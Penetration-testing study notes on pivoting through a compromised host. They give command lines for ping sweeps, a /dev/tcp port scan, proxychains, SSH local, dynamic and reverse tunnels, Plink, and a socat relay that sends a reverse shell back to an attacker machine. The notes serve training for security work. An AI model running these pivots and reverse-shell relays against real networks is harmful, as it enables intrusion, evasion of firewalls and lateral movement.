# Pivoting

---
## Basics
Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room.

Put simply, by using one of the techniques described in the following tasks (or others!), it becomes possible for an attacker to gain initial access to a remote network, and use it to access other machines in the network that would not otherwise be accessible:

---
## Pivoting Types 
There are two main methods encompassed in this area of pentesting:

- Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
 - Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host
> **As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal**.

---

## Things to check in the beginning - 

ARP Cache - `arp -a`
hosts file
ip configs

##### Static Binaries - 
`https://github.com/andrew-d/static-binaries`

##### Bash one liner to sweep the network 192.168.1.x -
`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`

##### Bash one liner to scan a host - 
(Note - This is very slow so try to find alternatives)
``for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done``

---

## Proxychains & Foxyproxy

`Note: If you want to do nmap scan try to find static binary instead of scanning through proxy as it can be very very slow.`

##### Usage - 

Add `proxychains` at the start of any command you want to run.
Eg: `proxychains nc 10.10.20.10 4444`

##### Configuration -

File - `/etc/proxychains.conf` but we can use specific config files if we want, we can do this by creating a `proxychains.conf` file in the directory we want to use proxychains in.

Default Config - Add these to the config file: 
```
[ProxyList]
socks4 127.0.0.1 9050
```
Note: Comment out  `proxy_dns`  option as this will hang nmap scans.

##### Important to know - 

You can only scan TCP and nothing else so use `-Pn` option in nmap if used. 


### Foxyproxy - 

We can use this when working with web based content 

---

## SSH Tunneling / Port Forwarding


### Forward Connections - 

When you can SSH from attacker machine to the victim

Eg: To access a web server on a remote host 192.168.0.10 which can be accessed by the machine 10.10.20.12 to which we have SSH access we can use this method to open a port on localhost 4000 and access port 8080 on victim machine -

Machine with SSH access - 10.10.20.12
Victim - 192.168.0.10

`ssh -L 4000:192.168.0.10:8080 victim@10.10.20.12 -fN`

Note - Here  `f`  backgrounds the shell immediately so that we have our own terminal back and  `N`  tells SSH that it doesn't need to execute any commands -- only set up the connection.

Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:  
`ssh -D 1337 user@172.16.0.5 -fN`  
This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.



### Reverse Connections -

To be used when you have access to a shell on a victim machine but not SSH access.

1. Create SSH Key and copy the contents of the .pub key
2. Edit the `~/.ssh/authorized_keys` and paste - `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty <ssh pub key contents>`
3. Restart SSH 
4. Connect back with Reverse port forward using - `ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN`
5. Reverse proxies can be made through - `ssh -R 1337 user@172.16.0.5 -fN`  

---

## Plink.exe

This is a windows version of the putty ssh client and this is usually used by transporting the binary to target and then using it to create a reverse connection. Command - 
``cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N``

Note: Any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with:  
`puttygen KEYFILE -o OUTPUT_KEY.ppk`


---

## Socat 

We can use this tool for reverse/bind shells, creating port forwards and much more.
It will usually be necessary to download a binary for it and then upload it to the box.

##### Reverse Shell Relay - 

We will create a relay for us to send a reverse shell back to our own machine from the victim machine.

1. Start netcat listener on kali - `nc -nvlp 4444`
2. Next, on the compromised server, use the following command to start the relay:  
`./socat tcp-l:8000 tcp:kali_IP:4444 &`
_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._
3. Next, we can create a reverse shell to the newly opened port 8000 on the compromised server